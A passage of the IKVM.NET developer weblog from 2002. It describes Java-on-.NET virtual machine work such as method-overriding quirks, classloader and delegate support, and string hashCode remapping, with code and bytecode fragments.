<P><FONT face="Courier, Monospace">public</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> </FONT><FONT color=#0000ff size=2>class</FONT><FONT size=2> c3 </FONT><FONT color=#0000ff size=2>extends</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> c2<BR></FONT><FONT face="Courier, Monospace">{<BR>&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT color=#0000ff size=2>public</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>void</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> m1()<BR>&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">System.out.println("c3.m1");<BR>&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">}</FONT></P>
<P></FONT><FONT face="Courier, Monospace" color=#0000ff size=2>&nbsp;&nbsp; void</FONT><FONT size=2><FONT face="Courier, Monospace"> m2()<BR>&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">System.out.println("c3.m2");<BR>&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">}<BR></FONT><FONT face="Courier, Monospace">}</FONT></FONT></P>
<P><FONT size=2><FONT face=Courier>
<HR>
</FONT>
<P></P></FONT><FONT color=#0000ff size=2>
<P><FONT face="Courier, Monospace">package</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> p2;</FONT></P></FONT><FONT color=#0000ff size=2>
<P><FONT face="Courier, Monospace">public</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> </FONT><FONT color=#0000ff size=2>class</FONT><FONT size=2> c2 </FONT><FONT color=#0000ff size=2>extends</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> c1<BR></FONT><FONT face="Courier, Monospace">{<BR>&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace" color=#0000ff size=2>void</FONT><FONT size=2><FONT face="Courier, Monospace"> m1()<BR>&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">System.out.println("c2.m1");<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; }</FONT></P>
<P></FONT><FONT face="Courier, Monospace"><FONT color=#0000ff size=2>&nbsp;&nbsp; private</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>void</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> m2()<BR>&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT size=2><FONT face="Courier, Monospace">System.out.println("c2.m2");<BR>&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">}<BR></FONT><FONT face="Courier, Monospace">}</FONT></FONT></P>
<P><FONT size=2>What will be the output when running p1.c1? (note that <EM>javac</EM> will not compile this code as&nbsp;is,&nbsp;but&nbsp;it is possible to create the resulting class files&nbsp;with javac by temporarily changing the sources and then recompiling the individual classes, but for convenience I've provided the equivalent code in <A href="http://mrl.nyu.edu/~meyer/jasmin/">Jasmin</A> <A href="http://www.frijters.net/override.zip">source</A>).</FONT></P>
<P><FONT size=2>The output is (using Sun's JDK 1.4.0 with the -Xfuture switch to enforce accessibility checking):<BR>c2.m1<BR>c1.m2<BR>c2.m1<BR>c3.m2</FONT></P>
<P><FONT size=2>What does this mean?</FONT></P>
<UL>
<LI><FONT size=2>It's possible to override a public method with a package private method (c1.m1 is overridden by c2.m1)</FONT></LI>
<LI><FONT size=2>A private method&nbsp;never overrides another method (making c1.m2 public doesn't make any difference)</FONT></LI>
<LI><FONT size=2>Private methods don't get in the way when finding methods to override (c3.m2 overrides c1.m2, even though c2.m2 is "in the way")</FONT></LI></UL>
<P><FONT size=2>Some other things I found:</FONT></P>
<UL>
<LI><FONT size=2>When <EM>invokespecial p1/c1/m2()V </EM>is added to c3.m2, it calls the <STRONG>private</STRONG> method c2.m2</FONT></LI>
<LI><FONT size=2>It isn't possible to override c3.m1 in another package, even though the original method (c1.m1) is public</FONT></LI></UL>
<P><FONT size=2>I implemented support for these behaviours (except the ability to call private methods from outside of the class). It's also interesting to note that none of this is described in the JVM spec.</FONT></P>
<P><FONT size=2>Fixed various bugs introduced by the classloader support.</FONT></P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/12/2002 12:05:55 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=51"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=51">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 09 September 2002</h2></div>
<div class="newsItems"><a name="a50"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Major changes. Big step towards multiple classloader support. The starter app now depends on classpath.dll and creates it's own (trivial) custom classloader (derived from URLClassLoader), so it now supports loading classes from zips and jars (courtesy of Classpath's URLClassLoader).</P>
<P>Note that this means that Java code that uses a custom classloader to dynamically generate classes (using ClassLoader.defineClass) should work now.</P>
<P>There is still some work to be done, because all the classloaders still shares a single namespace. Also, exception (and general error) handling isn't quite ready yet, either.</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/09/2002 17:02:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=50"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=50">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 05 September 2002</h2></div>
<div class="newsItems"><a name="a49"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Generics</STRONG></P>
<P>Yesterday, Microsoft Research released a beta version of <A href="http://research.microsoft.com/projects/clrgen/">Gyro</A>, which is their implementation of generics for <A href="http://msdn.microsoft.com/net/sscli">Rotor</A>.</P>
<P>I downloaded it this morning and played with it, and I must say, it's great! This is going to be <EM>the</EM> killer feature for .NET (once the commercial platform gets it). Unlike the platform that starts with a J, this is actually done right. The Java generics proposal that was floated for 1.4 and then withdrawn was an ugly (nay, <EM>disgusting)</EM> hack. Gyro is beautiful, I have no other word for it.</P>
<P>I can't wait for this to appear in the commercial platform!</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/05/2002 18:43:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=49"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=49">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 03 September 2002</h2></div>
<div class="newsItems"><a name="a48"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I did some work to get my database server app working. I implemented rudimentary socket support and some&nbsp;very lame AWT stuff. My database server now runs (including its lame GUI). Also fixed a few bugs (among others, support for long &amp; double volatiles, thanks to Richard Birkby for pointing this out to me).</P>
<P>Since I built the AWT in C#, linking it against classpath.dll, building is becoming a little more tricky. Hopefully I'll be able to make the build process more straight forward in the future, but for the time being you'll have to suffer ;-)</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/03/2002 19:19:30 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=48"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=48">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 30 August 2002</h2></div>
<div class="newsItems"><a name="a47"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Jamie commented:
<P><EM>I've just tried to run 'vjslib.dll' (the J# Java packages) through netexp. I'm getting a NotImplementedException: System.Boolean on line 355.</EM>
<P>I forgot to implement support for&nbsp;literal boolean fields.
<P><EM>I was wondering if this library could be used in place of the 'classpath.dll' one. In particular I was looking to see if the AWT would work. </EM>
<P>It's unlikely this will work (without major effort).
<P><EM>Does your classloader look for classes in the 'classpath.dll' library before or after ones on the classpath? Can this behaviour be easily changed?</EM>
<P>It looks in classpath.dll before it tries to load from the classpath, but at some point this will change (when I'm going to support multiple classloaders).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/30/2002 16:36:46 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=47"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=47">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 28 August 2002</h2></div>
<div class="newsItems"><a name="a46"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Added support for delegates to <EM>netexp </EM>and the VM. This enabled me to rewrite the thread startup in Java, here is a fragment from Thread.start():</P><PRE>ThreadStart starter = new ThreadStart(<BR>&nbsp; new ThreadStart.Method() {<BR>&nbsp;&nbsp;&nbsp; public void Invoke() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.SetData(localSlot, Thread.this);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; setPriorityNative();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; run();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Throwable t) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(group != null) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; group.uncaughtException(Thread.this, t);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } finally {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(group != null) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; group.removeThread(Thread.this);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp; });<BR>nativeThread = new Thread(starter);<BR>nativeThread.Start();<BR></PRE>
<P>The delegate appears to Java code as regular class with an inner interface named Method. The inner interface has one method named Invoke, with the signature of the delegate, and the delegate class appears to have a constructor taking a reference to the inner interface. What's nice about this scheme is that on the VM side, it is really trivial to support this. The only thing that is done, is whenever a delegate is constructed, two CIL instructions&nbsp;(dup &amp;&nbsp;ldvirtftn) get inserted into the code stream. The Java bytecode:</P>
<P>&nbsp; new java/lang/Thread$1&nbsp;<BR>&nbsp; dup&nbsp;<BR>&nbsp; aload_0&nbsp;<BR>&nbsp; invokespecial Thread$1/&lt;init&gt;(Ljava/lang/Thread;)V&gt;&nbsp;<BR>&nbsp; invokespecial ThreadStart/&lt;init&gt;(LThreadStart$Method;)V&gt;</P>
<P>Is compiled into:</P>
<P>&nbsp; ldarg.0<BR>&nbsp; newobj&nbsp; void Thread$1::.ctor(class java.lang.Thread)<BR>&nbsp; dup<BR>&nbsp; ldvirtftn&nbsp; void ThreadStart$Method::Invoke()<BR>&nbsp; newobj&nbsp; void ThreadStart::.ctor(object, native int)</P>
<P>So the delegate is constructed referencing the object implementing the interface.</P>
<P>(disclaimer: code fragments have been editted for readability, some assembly may be required)</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/28/2002 16:57:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=46"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=46">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 25 August 2002</h2></div>
<div class="newsItems"><a name="a45"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Stuart commented:</P>
<P><EM>Seems like building got a little more complicated (I don't seem to pick up your build options from your .sln file, and while before it was just a matter of turning on the unsafe option, it seems I need to do more than that now, like add some references, and I can't figure out which ones). I don't have enough time to do any serious investigation. </EM></P>
<P>That might be because of zlib.dll reference. I moved that into the project directory, so the relative path should be correct now.</P>
<P><EM>I'd love to play with ikvmc and netexp, though - any chance of including them in ikvmbin.zip?</EM></P>
<P>Done.</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/25/2002 11:53:49 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=45"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=45">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 22 August 2002</h2></div>
<div class="newsItems"><a name="a44"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Stuart commented:</P>
<P><EM>You can also optimize the test away (in the other direction) if it's known at compile time that the object *is* a string. Or is that unnecessary since String provides its own GetHashCode implementation that will be invokespecialed already since it's a final class (or whatever the CLR equivalent of final is)? </EM></P>
<P>When you compile the Java code <FONT face="Courier, Monospace" size=1>"foo".hashCode() </FONT>it will be compiled as an invokevirtual java/lang/String/hashCode()I. When IK.VM.NET tries to compile this, it looks up the hashCode() method on String and finds that it should redirect to the static StringHelper.hashCode() method. So that's automatic. It is possible to create bytecode that does an invokevirtual java/lang/Object/hashCode() on a string reference, but Java compilers won't do this, so this is hardly worth optimizing.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/22/2002 12:49:57 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=44"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=44">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 21 August 2002</h2></div>
<div class="newsItems"><a name="a43"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I&nbsp;changed java.lang.Class from being remapped to System.Type to&nbsp;its Java implementation.</P>
<P>Integrated some additional native code implementations from Stuart Ballard. Thanks Stuart!</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/21/2002 10:22:17 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=43"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=43">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 19 August 2002</h2></div>
<div class="newsItems"><a name="a42"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		I&nbsp;changed the XML remapping&nbsp;language to support Object.hashCode() &amp; Object.toString() twiddling (see <A href="http://weblog.ikvm.net/PermaLink.aspx/37">this</A> previous posting for more info). It is now possible to specify which CIL code sequence should be substituted for a call to a method. Here is how Object.hashCode() looks: 
<P><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>method</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>type</FONT><FONT color=#0000ff>="instance"</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="hashCode"</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>sig</FONT><FONT color=#0000ff>="()I"</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>access</FONT></FONT><FONT color=#0000ff size=1>="public"&gt;<BR>&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>override</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="GetHashCode"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;</FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>invokespecial</FONT></FONT><FONT color=#0000ff size=1>&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>call</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>class</FONT><FONT color=#0000ff>="System.Object</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="GetHashCode"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;/</FONT><FONT color=#800000>invokespecial</FONT></FONT><FONT color=#0000ff size=1>&gt;<BR>&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>invokevirtual</FONT></FONT><FONT color=#0000ff size=1>&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>dup</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>isinst</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>class</FONT><FONT color=#0000ff>="System.String"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>brfalse</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="skip"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>call</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>class</FONT><FONT color=#0000ff>="StringHelper"</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="hashCode"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>br</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="end"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>label</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="skip"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>callvirt</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>class</FONT><FONT color=#0000ff>="System.Object</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="GetHashCode"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp;&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;</FONT><FONT color=#800000>label</FONT><FONT color=#ff00ff> </FONT><FONT color=#ff0000>name</FONT><FONT color=#0000ff>="end"</FONT><FONT color=#ff00ff> </FONT></FONT><FONT color=#0000ff size=1>/&gt;<BR>&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT color=#0000ff>&lt;/</FONT><FONT color=#800000>invokevirtual</FONT></FONT><FONT color=#0000ff size=1>&gt;<BR></FONT></FONT><FONT face="Courier, Monospace"><FONT size=1><FONT size=2><FONT size=1><FONT size=6><FONT size=1><FONT color=#0000ff>&lt;/</FONT><FONT color=#800000>method</FONT><FONT color=#0000ff>&gt;</P>
<P></FONT></FONT></FONT></FONT></FONT></FONT></FONT>Every virtual call (the <EM>invokevirtual</EM> bytecode) is converted into a test to see if the call is being done on a string, if so it calls StringHelper.hashCode(), if not, it calls System.Object.GetHashCode(). This isn't yet how it should be, because when it is known at compile time that the&nbsp;reference that hashCode() is called on isn't a string, then this test shouldn't be emitted. I still have to figure out&nbsp;a way to support this optimization.</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/19/2002 14:53:35 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=42"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=42">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 16 August 2002</h2></div>
<div class="newsItems"><a name="a41"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I reimplemented java.io.FileDescriptor to directly&nbsp;use System.IO.Stream (compiling against the <EM>netexp</EM> generated mscorlib.jar). This approach seems workable. As an example of how this turns out, here is the FileDescriptor.sync() code:</P><PRE>&nbsp;public synchronized void sync() throws SyncFailedException<BR>&nbsp;{<BR>&nbsp;&nbsp;if(stream == null)<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;throw new SyncFailedException("The handle is invalid");<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;try<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;if(false) throw new system.io.IOException();<BR>&nbsp;&nbsp;&nbsp;stream.Flush();<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;catch(system.io.IOException x)<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;throw new SyncFailedException(x.get_Message());<BR>&nbsp;&nbsp;}<BR>&nbsp;}</PRE>
<P>I decided (for the moment)&nbsp;to not have every .NET method throw Throwable, but used the <EM>if(false) throw new ...</EM>&nbsp;trick. Works quite well, and it doesn't generate any code. I wonder if it would be legal for the compiler to move the stream.Flush() out of the try block... Not that I think any compiler would do this.</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snapshots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/16/2002 15:20:30 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=41"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=41">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 15 August 2002</h2></div>
<div class="newsItems"><a name="a40"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Nothing spectacular, many small changes (clean up, refactoring, bug fixes, enhancements).</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snapshots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/15/2002 18:34:28 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=40"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=40">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 12 August 2002</h2></div>
<div class="newsItems"><a name="a39"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I started on the ahead-of-time-compiler again, with the goal of precompiling the classpath classes. I've created a <A href="http://www.frijters.net/ikvmbin.zip">zip</A> containing all the binaries needed. Just unzip the file, make sure the directory is in the path and run a Java class:<BR><FONT face="Courier, Monospace"><STRONG>ikvm &lt;class&gt;</STRONG></FONT></P>
<P>It uses the CLASSPATH environment variable (instead of the earlier IKVM_CLASSPATH), and if that is not set, it assumes the current directory. Zips and jars are not yet supported.</P>
<P>The classpath.dll (from the binaries&nbsp;<A href="http://www.frijters.net/ikvmbin.zip">zip</A>) can also be used from (for example) a C# program (don't forget to add a reference to classpath.dll &amp; ik.vm.net.dll):</P><PRE>class JTest<BR>{<BR> public static void Main()<BR> {<BR> java.util.Hashtable h = new java.util.Hashtable();<BR> h.put("foo", "bar");<BR> h.put("fu", "baz");<BR> java.lang.System.&#64;out.println(h);<BR> }<BR>}</PRE>Updated the source <A href="http://www.frijters.net/ikvm.zip">snapshot</A>.
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
